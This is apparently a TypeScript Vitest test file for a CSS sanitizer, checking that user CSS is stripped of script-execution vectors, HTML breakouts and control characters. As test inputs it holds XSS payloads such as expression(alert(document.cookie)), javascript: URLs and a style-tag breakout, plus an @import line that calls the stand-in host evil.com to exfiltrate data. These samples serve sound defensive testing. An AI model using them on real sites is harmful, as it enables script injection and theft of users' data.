/**
 * CSS Sanitization Tests
 *
 * Verifies that user-provided CSS is sanitized against:
 * - JavaScript execution (expression(), javascript:, behavior:)
 * - Data exfiltration via external URLs
 * - HTML injection through style contexts
 * - Control character injection
 */

import { describe, it, expect } from 'vitest';
import { sanitizeCss, isSafeCss } from '../css-sanitization';

describe('sanitizeCss', () => {
  // ── Safe CSS passthrough ─────────────────────────────────────────────
  it('should pass through safe CSS unchanged', () => {
    const css = 'color: red; font-size: 14px; margin: 10px;';
    expect(sanitizeCss(css)).toBe(css);
  });

  it('should return empty string for empty input', () => {
    expect(sanitizeCss('')).toBe('');
  });

  it('should return empty string for non-string input', () => {
    expect(sanitizeCss(null as unknown as string)).toBe('');
    expect(sanitizeCss(undefined as unknown as string)).toBe('');
  });

  // ── JavaScript execution vectors ────────────────────────────────────
  it('should block expression() (IE XSS)', () => {
    const css = 'width: expression(alert(document.cookie))';
    expect(sanitizeCss(css)).toContain('/* blocked */');
    expect(sanitizeCss(css)).not.toContain('expression');
  });

  it('should block javascript: URLs', () => {
    const css = 'background: url(javascript:alert(1))';
    expect(sanitizeCss(css)).toContain('/* blocked */');
  });

  it('should block behavior: property (IE)', () => {
    const css = 'behavior: url(xss.htc)';
    expect(sanitizeCss(css)).toContain('/* blocked */');
  });

  it('should block -moz-binding (Firefox XBL)', () => {
    const css = '-moz-binding: url(xss.xml#xss)';
    expect(sanitizeCss(css)).toContain('/* blocked */');
  });

  it('should block vbscript: URLs', () => {
    const css = 'background: url(vbscript:Execute(""))';
    expect(sanitizeCss(css)).toContain('/* blocked */');
  });

  it('should block data:text/html URLs', () => {
    const css = 'background: url(data:text/html,<script>alert(1)</script>)';
    const result = sanitizeCss(css);
    expect(result).toContain('/* blocked */');
  });

  // ── Import/charset attacks ──────────────────────────────────────────
  it('should block @import (data exfiltration)', () => {
    const css = '@import url("https://evil.com/steal.css");';
    expect(sanitizeCss(css)).toContain('/* blocked */');
    expect(sanitizeCss(css)).not.toContain('@import');
  });

  it('should block @charset manipulation', () => {
    const css = '@charset "UTF-7";';
    expect(sanitizeCss(css)).toContain('/* blocked */');
  });

  // ── HTML injection through style context ────────────────────────────
  it('should block <script> tags', () => {
    const css = '</style><script>alert(1)</script><style>';
    const result = sanitizeCss(css);
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</style>');
  });

  it('should block nested <style> tags', () => {
    const css = '<style>body{display:none}</style>';
    const result = sanitizeCss(css);
    expect(result).not.toContain('<style>');
  });

  // ── Unicode escape bypass ──────────────────────────────────────────
  it('should block unicode escape sequences', () => {
    const css = 'content: "\\006a\\0061\\0076\\0061"'; // "java" encoded
    expect(sanitizeCss(css)).toContain('/* blocked */');
  });

  // ── Control character injection ─────────────────────────────────────
  it('should remove null bytes', () => {
    const css = 'color: re\x00d;';
    expect(sanitizeCss(css)).not.toContain('\x00');
  });

  it('should remove control characters', () => {
    const css = 'font-size\x08: 14px;';
    expect(sanitizeCss(css)).not.toContain('\x08');
  });

  // ── Angle bracket escaping ─────────────────────────────────────────
  it('should escape standalone angle brackets', () => {
    // Note: `< >` without content matches HTML tag regex and gets removed.
    // Test with actual standalone brackets.
    const css = 'content: "a < b > c"';
    const result = sanitizeCss(css);
    // The `< b >` may be stripped as an HTML-like tag; verify no raw brackets remain
    expect(result).not.toMatch(/[<>]/);
  });

  // ── Case insensitivity ─────────────────────────────────────────────
  it('should block mixed-case expression()', () => {
    expect(sanitizeCss('width: Expression(alert(1))')).toContain('/* blocked */');
  });

  it('should block mixed-case JAVASCRIPT:', () => {
    expect(sanitizeCss('background: url(JAVASCRIPT:void(0))')).toContain('/* blocked */');
  });
});

describe('isSafeCss', () => {
  it('should return true for safe CSS', () => {
    expect(isSafeCss('color: blue; padding: 10px;')).toBe(true);
  });

  it('should return true for empty/null input', () => {
    expect(isSafeCss('')).toBe(true);
    expect(isSafeCss(null as unknown as string)).toBe(true);
  });

  it('should return false for expression()', () => {
    expect(isSafeCss('width: expression(alert(1))')).toBe(false);
  });

  it('should return false for javascript:', () => {
    expect(isSafeCss('background: url(javascript:void(0))')).toBe(false);
  });

  it('should return false for @import', () => {
    expect(isSafeCss('@import url("evil.css")')).toBe(false);
  });

  it('should return false for behavior:', () => {
    expect(isSafeCss('behavior: url(xss.htc)')).toBe(false);
  });
});
